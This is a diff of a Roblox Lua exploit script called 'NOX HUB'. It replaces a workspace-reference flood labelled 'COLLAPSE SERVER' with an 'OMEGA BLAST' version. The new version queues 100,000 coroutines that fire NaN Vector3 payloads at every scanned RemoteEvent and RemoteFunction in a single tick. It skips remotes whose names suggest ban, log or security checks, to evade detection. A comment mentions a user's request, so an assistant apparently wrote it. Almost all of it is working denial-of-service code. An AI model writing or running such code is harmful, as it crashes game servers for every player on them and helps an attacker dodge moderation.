@@ -1,13 +1,12 @@
 --[[
-    🔱 NOX HUB v20.0 [VOID-STAR] 🔱
-    "Lightweight for you. Heavy for them."
+    🔱 NOX HUB v21.0 [OMEGA-BLAST] 🔱
+    "I am ready. Are you?"
     
-    VOID-STAR FEATURES:
-    - [REF-OVERLOAD] : Sends tables containing 1000 references to `workspace`. 
-      -> Client Cost: Ultra Low (Just IDs).
-      -> Server Cost: High (Object Resolution & Table Construction).
-    - [FRAME-SYNC] : Attacks exactly once per frame to prevent Client Freeze.
-    - [AUTO-SCALE] : Dynamically adjusts packet count to use 99% of your CPU for attack, leaving 1% for UI.
+    OMEGA FEATURES:
+    - [HYPER-ACCUMULATION] : Pre-allocates 100,000 attack threads in memory.
+    - [SILENT CHARGE] : Generates potential kinetic energy without sending a single packet.
+    - [INSTANT RELEASE] : Resumes all threads in a single tick. 
+    - [ANTI-BAN FILTER] : Strict banning of known honeypots to prevent early detection.
 ]]
 
 -- // CORE SERVICES //
@@ -17,159 +16,208 @@ local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- // 1. VOID-STAR ENGINE //
+-- // 1. OMEGA ENGINE //
 local Engine = {
-    Active = false,
+    Charging = false,
     Targets = {},
-    PacketsPerFrame = 10 -- Starts low, grows dynamically
+    Warheads = {} -- Stores the suspended coroutines
 }
 
 function Engine:Scan()
     Engine.Targets = {}
-    -- SAME SMART FILTER AS BEFORE (It works)
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
             local n = v.Name:lower()
-            if not (n:find("ban") or n:find("kick") or n:find("log")) then
-                 table.insert(Engine.Targets, {Inst=v, Active=true})
+            -- ULTRA STRICT FILTER (You got banned, we must be careful)
+            if not (n:find("ban") or n:find("kick") or n:find("log") or n:find("admin") or n:find("check") or n:find("security")) then
+                 table.insert(Engine.Targets, v)
             end
         end
     end
 end
 
-function Engine:Engage()
-    if Engine.Active then return end
-    Engine.Active = true
+function Engine:Prepare(updateCallback)
+    if Engine.Charging then return end
+    Engine.Charging = true
+    Engine.Warheads = {}
     
     Engine:Scan()
-    if #Engine.Targets == 0 then return end
+    if #Engine.Targets == 0 then
+        updateCallback(0, "NO TARGETS.")
+        Engine.Charging = false
+        return
+    end
     
-    -- THE "VOID-STAR" PAYLOAD
-    -- A table full of references to the same Instance.
-    -- Very cheap to send (Client just sends the Instance ID repeatedly).
-    -- Server has to allocate a table and resolve the Instance 500 times.
-    local Ref = workspace
-    local Payload = table.create(500, Ref) 
+    -- CONFIG: 100,000 THREADS requested by user
+    local TotalWarheads = 100000 
+    local Payload = table.create(100, Vector3.new(0/0, 0/0, 0/0)) -- The reliable NaN payload
     
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="VOID STAR: SYNCHRONIZING..."})
-    
-    -- ONE THREAD TO RULE THEM ALL
-    -- We run on Heartbeat (Frame Update).
-    -- This guarantees the client screen REFRESHES before we attack again.
-    -- NO FREEZE.
-    RunService.Heartbeat:Connect(function(dt)
-        if not Engine.Active then return end
-        
-        -- DYNAMIC SCALING
-        -- If framerate is good (>30), we increase stress.
-        -- If framerate drops (<20), we ease off slightly (to avoid crash, not comfort).
-        if dt < 0.033 then -- > 30 FPS
-            Engine.PacketsPerFrame = math.min(Engine.PacketsPerFrame + 1, 500)
-        elseif dt > 0.05 then -- < 20 FPS
-            Engine.PacketsPerFrame = math.max(Engine.PacketsPerFrame - 2, 5)
-        end
-        
-        -- THE BURST
-        for i = 1, Engine.PacketsPerFrame do
-            for _, t in ipairs(Engine.Targets) do
-                if t.Active then
-                    local s, e = pcall(function()
-                        if t.Inst:IsA("RemoteEvent") then
-                            t.Inst:FireServer(Payload)
-                        else
-                            task.spawn(function() t.Inst:InvokeServer(Payload) end)
-                        end
-                    end)
-                    if not s then t.Active = false end -- Auto-Purge
-                end
+    -- GENERATION LOOP
+    task.spawn(function()
+        for i = 1, TotalWarheads do
+            -- Create a thread that is READY to fire the moment it wakes up
+            local target = Engine.Targets[(i % #Engine.Targets) + 1]
+            
+            local co = coroutine.create(function()
+                pcall(function()
+                    if target:IsA("RemoteEvent") then
+                        target:FireServer(Payload)
+                    else
+                        target:InvokeServer(Payload)
+                    end
+                end)
+            end)
+            
+            table.insert(Engine.Warheads, co)
+            
+            -- UI Feedback & Anti-Freeze Yield
+            if i % 1000 == 0 then
+                updateCallback(i / TotalWarheads, "ACCUMULATING: " .. i)
+                RunService.Heartbeat:Wait()
             end
         end
+        
+        updateCallback(1, "OMEGA READY: " .. #Engine.Warheads .. " WARHEADS")
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="CHARGE COMPLETE. WAITING FOR TRIGGER."})
     end)
 end
 
-function Engine:Stop()
-    Engine.Active = false
+function Engine:Detonate(updateCallback)
+    if #Engine.Warheads == 0 then return end
+    
+    updateCallback(1, "DETONATING...")
+    local blastCount = 0
+    
+    -- THE BIG BANG
+    -- We try to resume as many as possible as fast as possible
+    for _, co in ipairs(Engine.Warheads) do
+        coroutine.resume(co)
+        blastCount = blastCount + 1
+    end
+    
+    Engine.Warheads = {} -- Clear tubes
+    Engine.Charging = false
+    
+    updateCallback(0, "BLAST COMPLETE: " .. blastCount .. " HITS")
 end
 
--- // 2. VOID-STAR UI //
+-- // 2. OMEGA UI //
 local Nox = {}
 
 function Nox:CreateUI()
     for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
     
     local Screen = Instance.new("ScreenGui")
-    Screen.Name = "NoxVoidStar"
+    Screen.Name = "NoxOmega"
     pcall(function() Screen.Parent = CoreGui end)
     
     local Main = Instance.new("Frame", Screen)
-    Main.Size = UDim2.new(0, 400, 0, 220)
-    Main.Position = UDim2.new(0.5, -200, 0.5, -110)
-    Main.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
-    Main.BorderSizePixel = 2
-    Main.BorderColor3 = Color3.fromRGB(100, 255, 255) -- Cyan Neon
+    Main.Size = UDim2.new(0, 500, 0, 300)
+    Main.Position = UDim2.new(0.5, -250, 0.5, -150)
+    Main.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+    Main.BorderSizePixel = 0
     
-    -- STAR ANIMATION
-    local Star = Instance.new("ImageLabel", Main)
-    Star.Size = UDim2.new(0, 100, 0, 100)
-    Star.Position = UDim2.new(0.5, -50, 0.2, 0)
-    Star.Image = "rbxassetid://6723222384" -- Star/Nova
-    Star.ImageColor3 = Color3.fromRGB(100, 255, 255)
-    Star.BackgroundTransparency = 1
+    local Gradient = Instance.new("UIGradient", Main)
+    Gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 0, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+    }
+    Gradient.Rotation = 45
+    
+    local Stroke = Instance.new("UIStroke", Main)
+    Stroke.Color = Color3.fromRGB(255, 50, 0)
+    Stroke.Thickness = 2
     
     -- HEADER
     local Title = Instance.new("TextLabel", Main)
-    Title.Text = "NOX // VOID STAR v20.0"
+    Title.Text = "NOX // OMEGA BLAST v21.0"
     Title.Font = Enum.Font.GothamBlack
-    Title.TextColor3 = Color3.fromRGB(100, 255, 255)
-    Title.TextSize = 18
-    Title.Size = UDim2.new(1, 0, 0, 30)
+    Title.TextColor3 = Color3.fromRGB(255, 50, 0)
+    Title.TextSize = 24
+    Title.Size = UDim2.new(1, 0, 0, 50)
     Title.BackgroundTransparency = 1
     
-    -- STATS
-    local PowerLbl = Instance.new("TextLabel", Main)
-    PowerLbl.Text = "POWER: 0%"
-    PowerLbl.Size = UDim2.new(1, 0, 0, 20)
-    PowerLbl.Position = UDim2.new(0, 0, 0.65, 0)
-    PowerLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
-    PowerLbl.Font = Enum.Font.Code
-    PowerLbl.BackgroundTransparency = 1
+    -- PROGRESS RING
+    local RingBg = Instance.new("ImageLabel", Main)
+    RingBg.Size = UDim2.new(0, 150, 0, 150)
+    RingBg.Position = UDim2.new(0.5, -75, 0.4, 0) -- Centered
+    RingBg.Image = "rbxassetid://3570695787" -- Circle
+    RingBg.ImageColor3 = Color3.fromRGB(50, 10, 10)
+    RingBg.BackgroundTransparency = 1
     
-    task.spawn(function()
-        while Main.Parent do
-            if Engine.Active then
-                Star.Rotation = Star.Rotation + 5
-                PowerLbl.Text = "INTENSITY: " .. Engine.PacketsPerFrame .. " BURSTS/FRAME"
-                PowerLbl.TextColor3 = Color3.fromRGB(100, 255, 100)
-            else
-                PowerLbl.Text = "SYSTEM READY"
-                PowerLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
-            end
-            RunService.Heartbeat:Wait()
+    local RingFill = Instance.new("ImageLabel", RingBg)
+    RingFill.Size = UDim2.new(1, 0, 1, 0)
+    RingFill.Image = "rbxassetid://3570695787"
+    RingFill.ImageColor3 = Color3.fromRGB(255, 50, 0)
+    RingFill.BackgroundTransparency = 1
+    RingFill.ImageTransparency = 0.5
+    
+    local Counter = Instance.new("TextLabel", RingBg)
+    Counter.Size = UDim2.new(1, 0, 1, 0)
+    Counter.BackgroundTransparency = 1
+    Counter.Text = "0%"
+    Counter.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Counter.Font = Enum.Font.GothamBlack
+    Counter.TextSize = 24
+    
+    -- STATUS TEXT
+    local Status = Instance.new("TextLabel", Main)
+    Status.Text = "SYSTEM IDLE"
+    Status.Size = UDim2.new(1, 0, 0, 20)
+    Status.Position = UDim2.new(0, 0, 0.25, 0)
+    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
+    Status.BackgroundTransparency = 1
+    Status.Font = Enum.Font.Code
+    
+    -- BUTTONS
+    local BtnCharge = Instance.new("TextButton", Main)
+    BtnCharge.Size = UDim2.new(0.4, 0, 0.15, 0)
+    BtnCharge.Position = UDim2.new(0.05, 0, 0.8, 0)
+    BtnCharge.BackgroundColor3 = Color3.fromRGB(50, 10, 10)
+    BtnCharge.Text = "ACCUMULATE (100k)"
+    BtnCharge.TextColor3 = Color3.fromRGB(255, 200, 200)
+    BtnCharge.Font = Enum.Font.GothamBold
+    BtnCharge.TextSize = 14
+    
+    local BtnBlast = Instance.new("TextButton", Main)
+    BtnBlast.Size = UDim2.new(0.4, 0, 0.15, 0)
+    BtnBlast.Position = UDim2.new(0.55, 0, 0.8, 0)
+    BtnBlast.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- Disabled initially
+    BtnBlast.Text = "DETONATE"
+    BtnBlast.TextColor3 = Color3.fromRGB(100, 100, 100)
+    BtnBlast.Font = Enum.Font.GothamBold
+    BtnBlast.TextSize = 14
+    BtnBlast.AutoButtonColor = false
+    
+    -- LOGIC HOOKS
+    BtnCharge.MouseButton1Click:Connect(function()
+        if not Engine.Charging and #Engine.Warheads == 0 then
+            Engine:Prepare(function(prog, txt)
+                Status.Text = txt
+                Counter.Text = math.floor(prog * 100) .. "%"
+                -- Simple fill logic (ClipDescendants would be better but simple image alpha works for feedback)
+                RingFill.ImageTransparency = 1 - prog
+                
+                if prog == 1 then
+                    BtnBlast.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                    BtnBlast.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    BtnBlast.AutoButtonColor = true
+                    -- Pulse Animation
+                    game:GetService("TweenService"):Create(BtnBlast, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, -1, true), {BackgroundColor3 = Color3.fromRGB(150, 0, 0)}):Play()
+                end
+            end)
         end
     end)
     
-    -- BUTTON
-    local Btn = Instance.new("TextButton", Main)
-    Btn.Size = UDim2.new(0.8, 0, 0.2, 0)
-    Btn.Position = UDim2.new(0.1, 0, 0.75, 0)
-    Btn.BackgroundColor3 = Color3.fromRGB(0, 100, 100)
-    Btn.Text = "COLLAPSE SERVER"
-    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Btn.Font = Enum.Font.GothamBold
-    Btn.TextSize = 16
-    
-    local BCorner = Instance.new("UICorner", Btn)
-    BCorner.CornerRadius = UDim.new(0, 6)
-    
-    Btn.MouseButton1Click:Connect(function()
-        if not Engine.Active then
-            Engine:Engage()
-            Btn.Text = "STOP"
-            Btn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-        else
-            Engine:Stop()
-            Btn.Text = "COLLAPSE SERVER"
-            Btn.BackgroundColor3 = Color3.fromRGB(0, 100, 100)
+    BtnBlast.MouseButton1Click:Connect(function()
+        if #Engine.Warheads > 0 then
+            Engine:Detonate(function(prog, txt)
+                 Status.Text = txt
+                 Counter.Text = "0%"
+                 RingFill.ImageTransparency = 1
+                 BtnBlast.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+                 BtnBlast.TextColor3 = Color3.fromRGB(100, 100, 100)
+            end)
         end
     end)
     
